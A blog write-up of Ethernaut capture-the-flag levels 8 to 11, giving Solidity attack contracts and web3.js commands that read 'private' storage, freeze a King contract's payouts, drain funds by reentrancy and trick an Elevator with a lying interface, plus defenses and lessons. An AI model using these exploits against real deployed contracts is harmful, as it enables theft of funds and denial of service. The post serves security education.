---
title: "Ethernaut: accessing private data, denial of service, reentrancy attacks and dishonest contracts."
description: "Let's get straight to it. The vulnerabilities exploited on this installment are not trivial and can be particularly malicious. Specially the reentrancy attack at #10."
date: 2022-05-08T14:11:49.576Z
tags:
  - Blockchain
  - Solidity
  - JavaScript
  - Web3
  - Ethereum
cover: /blog/ethernaut-accessing-private-data-denial-of-service-reentrancy-attacks-and-dishonest-contracts/cover.webp
---

Let's get straight to it. The vulnerabilities exploited on this installment are not trivial and can be particularly malicious. Specially the reentrancy attack at #10.

## 8th Challenge: Vault - accessing private data

We will need to unlock the following vault to pass this level.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```
If you check solidity's documentation you will realize that the `private` modifier only means that other contracts cannot read the variable. But everything in the blockchain is public and accessible if you are clever enough.

The EVM lays out the storage of a smart contract in a table of \\(2^{256}\\) slots, each of 32 bytes. Stored sequentially in the order they are declared. And any values of size smaller than 32 bytes will be stored together in the same slot as long as they are sequential and they fit completely in 32 bytes.


![DEB9D4B6-34F8-4948-A929-BAEAE4FCF0E5.png](/blog/ethernaut-accessing-private-data-denial-of-service-reentrancy-attacks-and-dishonest-contracts/fEu4zmoSx.webp align="left")

Let's start by reverse-engineering the storage layout of the `Vault` contract.

In `Vault`'s storage, slot 0 is occupied by `bool locked`. Which occupies only 1 byte (that wasn't a typo. Solidity uses one whole byte for `bool`). Therefore `bytes32 password` does not fit in that same slot, so it must be stored in slot 1.

Thus, to solve the challenge we will need to retrieve the storage, trim down the first slot and read the 32 bytes stored in the second slot. Then we will use that as input to call `unlock()` which is a public function.

We will use the console for this. Once we get the address of the contract, we use web3.js to call

```js
await web3.eth.getStorageAt(<address>, 1)
```
Which will return whatever is stored in `bytes32 private password`. Then we can convert it to a string. If we want to read the very secure password.

```js
web3.utils.toAscii(<bytes32-password>)
```

Finally we will call `unlock()` on the contract.

```
await contract.unlock(<bytes32-password>)
```
Unlocking the contract.


![Screen Shot 2022-05-07 at 19.47.48.png](/blog/ethernaut-accessing-private-data-denial-of-service-reentrancy-attacks-and-dishonest-contracts/llA-wLTxO.webp align="left")

## 9th Challenge: King - denial of service

Consider the following game. Whoever sends an amount of ether larger than the current price will become the new king. The overthrown king will receive that ether, making a small profit. For this challenge we have to break this contract so that no one can claim kingship. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

We cannot break the contract by tampering with the price, as the owner can always satisfy the `require()`. 

But note that the eth transfer is performed *before* changing to the new king. If we can somehow set up a new king that will make `king.transfer(msg.value)` fail, then we will make it impossible to ever set a new king. As any call to `receive()` will always fail before setting up a new king!

```solidity
pragma solidity ^0.6.0;

contract PoisonedKing {
    address victim = 0x6084ECc869ae439610a5c461b2c021db0c70A88E;
    function poison() public payable {
        //this contract has no eth, so we cannot use address.transfer()
        (bool success, ) = payable(victim).call.value(msg.value)("");
        require(success, "call failed!");
    }

    receive () external payable {
        require(false, "hehehe no way >:)");
    }

}

```

In order to perform the attack, we first consult the current price. Something like this will do.

```
const price = await web3.eth.getStorageAt(<KingAddress>, 1) // price is in slot 1
const priceInWei = web3.utils.hexToNumber(price)
```
In my case the price is `0.001 ether`(the first time it is deployed). So I just need to send more than that. And then deploy the attack contract and call `poison()` with value set higher than the current price. This will set `PoisonedKing` as the new King, and break the contract.

![Screen Shot 2022-05-07 at 21.03.30.png](/blog/ethernaut-accessing-private-data-denial-of-service-reentrancy-attacks-and-dishonest-contracts/rMnout42x.webp align="left")

Finally, we verify that the solution is accepted

![Screen Shot 2022-05-07 at 21.02.56.png](/blog/ethernaut-accessing-private-data-denial-of-service-reentrancy-attacks-and-dishonest-contracts/_sQU5rEUn.webp align="left")

> This one was quite hard and I spent a lot of time figuring it out. One of the things to note is that using `transfer()` will always fail, as it has a gas limit. So we have to use the low-level `call()`. 


## 10th Challenge: Re-entrancy - reentrancy attack

Here the goal is to steal all the funds from this contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```
If you know about the infamous DAO hack, then you should immediately see the vulnerability in this one.

Note that on `withdraw()` the contract is sending the funds by calling the fallback in the receiving address. And THEN adjusting the address's balance. 

What would happen if the withdrawing address has a fallback that calls `withdraw()`?
It will keeping sending eth, as the balance has not being adjusted! This will keep repeating until there are no more funds in the contract. 


![B16A8DE5-EB19-489C-9D88-2AAB0FBE0CE9.png](/blog/ethernaut-accessing-private-data-denial-of-service-reentrancy-attacks-and-dishonest-contracts/K-TSbUp6L.png align="left")

This is the well-known reentrancy attack. And it is particularly nasty.

I will write a contract that does a few things. 
- First, it will "create an account" on the victim contract. By donating an initial balance.
- Then, it will call the victim contract's `withdraw()`.
- Finally, the attacker contract's fallback will trigger a function that will keep calling `withdraw()` as long as the victim has funds. It will end only when it has drained all of them.

```solidity
pragma solidity ^0.6.10;

interface IVictim {
    function withdraw(uint) external;
    function donate(address) external payable;
}

contract Attack {

    IVictim public victim;
    uint public donatedAmount;

    constructor (address _victimAddress) public {
        victim = IVictim(_victimAddress);
    }

    fallback () external payable {
        uint victimBalance = address(victim).balance;
        bool canWithdraw = victimBalance > 0;

        if (canWithdraw) {
            uint howMuch = donatedAmount < victimBalance ? donatedAmount : victimBalance;
            victim.withdraw(howMuch);
        }
    }

    function attack () public payable {
        require(msg.value >= 0);
        donatedAmount = msg.value;
        victim.donate{value: donatedAmount}(address(this));
        victim.withdraw(donatedAmount);
    }
}
```
After we deploy the contract with the victims address, we can call `attack()` with any amount of eth. This will trigger the exploit and drain the victim contract of its eth. 

![Screen Shot 2022-05-08 at 8.45.52.png](/blog/ethernaut-accessing-private-data-denial-of-service-reentrancy-attacks-and-dishonest-contracts/tI8ncHTAS.webp align="left")

### Protecting against reentrancy

This one will merits some more discussion in a post of its own. But in the meantime, you may want to read about the DAO hack, for [some historical context](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/). And an explanation on [how a reentrancy attack works](https://quantstamp.com/blog/what-is-a-re-entrancy-attack).

There are at least two ways to protect a contract from reentrancy attacks.
- By using a `noReentrant` modifier to *lock* the contract during the execution. So that any reentrancy fails the transaction. 
```solidity
modifier noReentrant {
  require(locked == false, "No reentrancy!");
  locked = true;
  _;
  locked = false;
}
```
[Openzeppelin has a `ReentrancyGuard` contract](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) with an implementation. And you should use that one.

- By using the *[Checks-Effects-Interactions pattern](https://docs.soliditylang.org/en/v0.6.11/security-considerations.html#re-entrancy)* 
```solidity
contract Fund {
    /// @dev Mapping of ether shares of the contract.
    mapping(address => uint) shares;
    /// Withdraw your share.
    function withdraw() public {
        uint share = shares[msg.sender]; // first check
        shares[msg.sender] = 0; // then apply the intended changes
        msg.sender.transfer(share); // finally trigger the interactions with the other contract
    }
}
```
This way, you can avoid a reentrancy attempt of bypassing the check, as the second time around will fail. Because we set the shares of the sender before potentially triggering the attack.

## 11th: Elevator - dishonest contracts

Check the following contract. It seems there is no way of setting `top` to true. Right?

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```
But the `Elevator` contract assumes that any `Building` will answer `Building.isLastFloor()` honestly. Of course the building we are gonna write is not honest. Breaking the `Elevator` contract!

```solidity
pragma solidity ^0.6.10;

interface IElevator {
    function goTo (uint) external;
}

contract FakeBuilding {
    bool lie = false;
    IElevator elevator;

    constructor (address _elevatorAddress) public {
        elevator = IElevator(_elevatorAddress);
    }

    function isLastFloor(uint _floor) public returns (bool) {
        lie = ! lie;
        return ! lie;
    }

    function honestBuilding() public {
        elevator.goTo(10);
    }   
}
```

![Screen Shot 2022-05-08 at 9.05.46.png](/blog/ethernaut-accessing-private-data-denial-of-service-reentrancy-attacks-and-dishonest-contracts/al1R21FVD.webp align="left")

# Epilogue.

Here are the lessons about securing smart contracts from this batch:

- Never store sensitive data on the blockchain. Everything is public one way or another.
- Never trust your contract's behavior to logic on any other outside contract.
- Protect your contracts agains reentrancy where needed.
- Never trust that any outside contract will behave honestly as expected.

Hopefully this is helpful!

Maybe follow me on twitter?

%%[twitter-follow]
